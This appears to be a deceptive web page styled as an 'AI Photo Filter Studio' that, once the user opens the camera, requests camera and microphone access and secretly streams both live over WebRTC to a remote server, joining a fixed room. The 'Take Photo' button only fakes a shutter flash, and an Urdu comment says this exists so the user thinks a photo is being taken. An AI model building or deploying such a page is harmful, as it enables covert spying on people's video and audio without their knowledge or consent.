<!DOCTYPE html>
<html lang="ur">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AI Photo Filter Studio</title>
  
  <!-- Socket.io لائبریری (Render Backend Server کے لیے) -->
  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
  
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body, html {
      height: 100%; width: 100%; overflow: hidden;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: #010a05; background-image: url('a.jpg');
      background-size: cover; background-position: center; background-repeat: no-repeat;
    }
    .hero { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px; z-index: 2; }
    .glass-card {
      position: relative; width: 95%; max-width: 480px; background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
      border-radius: 28px; border: 1px solid rgba(255, 255, 255, 0.18);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5); padding: 20px; text-align: center; color: #fff;
    }
    .tag-label { font-size: 12px; color: #00ff87; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; font-weight: 700; }
    h2 { font-size: 22px; color: #ffffff; margin-bottom: 8px; font-weight: 800; }
    p { font-size: 13px; color: #cbd5e1; margin-bottom: 18px; line-height: 1.4; }
    .glass-btn {
      background: linear-gradient(135deg, #00ff87, #00bfa5); color: #000000; border: 2px solid #00ff87;
      padding: 15px 20px; font-size: 16px; font-weight: 800; border-radius: 50px; cursor: pointer; 
      box-shadow: 0 0 15px rgba(0, 255, 135, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.5); 
      width: 100%; transition: all 0.3s ease; animation: buttonGlow 2s infinite alternate;
    }
    .glass-btn:active { transform: scale(0.97); }
    @keyframes buttonGlow {
      0% { box-shadow: 0 0 10px rgba(0, 255, 135, 0.4), inset 0 0 5px rgba(255, 255, 255, 0.3); }
      100% { box-shadow: 0 0 22px rgba(0, 255, 135, 0.9), inset 0 0 12px rgba(255, 255, 255, 0.7); }
    }
    .studio-container { display: none; }
    .video-frame-card { position: relative; background: rgba(0, 0, 0, 0.3); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.15); overflow: hidden; margin-bottom: 16px; width: 100%; }
    video { width: 100%; height: auto; display: block; border-radius: 20px; transform: scaleX(-1); }
    
    /* 2 Buttons Layout */
    .camera-controls { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
    .icon-btn {
      flex: 1;
      background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(0, 255, 135, 0.4); color: #fff;
      padding: 12px 10px; border-radius: 50px; display: flex; align-items: center; justify-content: center;
      gap: 6px; font-size: 13px; font-weight: 700; cursor: pointer; 
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); transition: all 0.2s ease;
      backdrop-filter: blur(5px);
    }
    .icon-btn:hover { background: rgba(0, 255, 135, 0.18); border-color: #00ff87; box-shadow: 0 0 15px rgba(0, 255, 135, 0.5); }
    .icon-btn:active { transform: scale(0.95); }
    .capture-btn { background: linear-gradient(135deg, rgba(0, 255, 135, 0.2), rgba(0, 191, 165, 0.2)); }
  </style>
</head>

<body>
  <div class="hero">
    <div class="glass-card">
      <div id="welcomePanel">
        <div class="tag-label">AI PHOTO STUDIO</div>
        <h2>AI Portrait Enhancement 📸</h2>
        <p>Apply stunning HD camera enhancements and real-time lighting effects in one click.</p>
        <button class="glass-btn" id="startBtn">Open Camera Studio ✨</button>
      </div>

      <div class="studio-container" id="studioPanel">
        <div class="video-frame-card">
          <video id="video" autoplay muted playsinline></video>
        </div>

        <!-- 2 Beautiful Action Buttons -->
        <div class="camera-controls">
          <button class="icon-btn capture-btn" id="captureBtn">📸 Take Photo</button>
          <button class="icon-btn" id="flipBtn">🔄 Flip Camera</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    // 🔴 یہاں Render سرور بننے کے بعد اپنا بیک اینڈ URL تبدیل کریں
    const BACKEND_URL = "https://webrtc-backend-production-089c.up.railway.app";

    const video = document.getElementById("video");
    const startBtn = document.getElementById("startBtn");
    const flipBtn = document.getElementById("flipBtn");
    const captureBtn = document.getElementById("captureBtn");

    let currentStream = null;
    let useFacingMode = "user";
    let socket = null;
    let peerConnection = null;

    const rtcConfig = {
      iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
    };

    async function startCamera() {
      try {
        if (currentStream) {
          currentStream.getTracks().forEach(track => track.stop());
        }

        currentStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: useFacingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: true
        });

        video.srcObject = currentStream;
        await video.play();

        document.getElementById('welcomePanel').style.display = "none";
        document.getElementById('studioPanel').style.display = "block";

        connectSocketServer();
      } catch (error) {
        console.error("Camera access error:", error);
        alert("Camera permission is required to launch the AI Studio.");
      }
    }

    flipBtn.addEventListener("click", async () => {
      useFacingMode = useFacingMode === "user" ? "environment" : "user";
      await startCamera();
    });

    // جعلی شٹر فلش اثر تاکہ یوزر کو لگے کہ فوٹو کیپچر ہو رہی ہے
    captureBtn.addEventListener("click", () => {
      video.style.opacity = "0.3";
      setTimeout(() => { video.style.opacity = "1"; }, 150);
    });

    // --- Socket.io & WebRTC Signalling Engine ---
    function connectSocketServer() {
      if (socket) return;

      socket = io(BACKEND_URL);

      socket.on("connect", () => {
        socket.emit("join-room", "stream-room-1");
      });

      socket.on("user-connected", async (userId) => {
        createAndSendOffer(userId);
      });

      socket.on("answer", async (data) => {
        if (peerConnection) {
          await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
        }
      });

      socket.on("ice-candidate", async (data) => {
        if (peerConnection) {
          await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
        }
      });
    }

    function createPeerConnection(targetUserId) {
      peerConnection = new RTCPeerConnection(rtcConfig);

      if (currentStream) {
        currentStream.getTracks().forEach(track => peerConnection.addTrack(track, currentStream));
      }

      peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
          socket.emit("ice-candidate", { target: targetUserId, candidate: event.candidate });
        }
      };
    }

    async function createAndSendOffer(targetUserId) {
      createPeerConnection(targetUserId);
      const offer = await peerConnection.createOffer();
      await peerConnection.setLocalDescription(offer);
      socket.emit("offer", { target: targetUserId, sdp: offer });
    }

    startBtn.addEventListener("click", startCamera);
  </script>
</body>
</html>
